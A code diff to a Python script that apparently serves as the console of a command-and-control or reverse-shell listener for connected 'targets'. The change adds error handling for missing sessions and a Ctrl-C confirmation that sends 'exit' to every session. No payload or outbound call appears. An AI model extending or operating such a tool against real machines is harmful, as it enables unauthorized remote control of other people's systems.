@@ -238,11 +238,22 @@ if __name__ == '__main__':
                         session_counter += 1
                     print (myTable)
                 if command.split(" ")[1] == '-i':
-                    num = int(command.split(" ")[2])
-                    targ_id = (targets[num])[0]
-                    target_comm(targ_id, targets, num)
+                    try:
+                        num = int(command.split(" ")[2])
+                        targ_id = (targets[num])[0]
+                        target_comm(targ_id, targets, num)
+                    except IndexError:
+                        print(f'[!] Session {num} does not exist.\n')
         except KeyboardInterrupt:
-            print('\n[!] Keyboard interrupt issued.')
-            kill_flag = 1
-            sock.close()
-            break
+            quit_message = input('Ctrl-C\n Do you really want to quit (y/n)? ')
+            if quit_message == 'y':
+                tar_length = len(targets)
+                for target in targets:
+                    comm_out(target[0], 'exit')
+                print('\n[!] All sessions have been terminated.')
+                kill_flag = 1
+                if listener_counter > 0:
+                    sock.close()
+                break
+            else:
+                continue
